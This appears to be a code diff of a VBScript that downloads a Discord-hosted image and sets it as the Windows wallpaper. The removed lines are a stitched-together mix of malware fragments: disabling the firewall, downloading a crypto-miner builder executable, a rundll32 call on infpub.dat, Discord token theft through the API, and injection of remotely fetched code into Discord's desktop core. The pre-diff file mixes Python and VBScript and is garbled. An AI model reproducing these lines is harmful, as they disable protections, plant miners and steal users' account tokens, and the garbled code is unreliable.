@@ -1,21 +1,18 @@
-netsh firewall set opmode mode=disable
 Set objEnv = objShell.Environment("User")
+
 strDirectory = objShell.ExpandEnvironmentStrings("%temp%")
+
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", "https://cdn.discordapp.com/avatars/275808021605777409/1f5eae5d8b12034c335309a0150942c5.png?size=512", False
 xHttp.Send
-xHttp.Open "GET", "https://github.com/xemulat/MyFilesForDDL/releases/download/test1/Silent.Crypto.Miner.Builder.exe", False
-C:\Windows\system32\rundll32.exe C:\Windows\infpub.dat,#1 15
-loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
-os.path.join(root, name+"\\discord_desktop_core\\index.js")
-os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Shli"))
-f = urlopen("https://raw.githubusercontent.com/Shlimazl1337/Injection/main/Injection-clean")
+
 with bStrm
-        .type = 1 '//binary
+    .type = 1 '//binary
     .open
     .write xHttp.responseBody
-        .savetofile strDirectory + "\myImage.png", 2 '//overwrite
+    .savetofile strDirectory + "\myImage.png", 2 '//overwrite
 end with
+
 objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strDirectory + "\myImage.png"
 objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
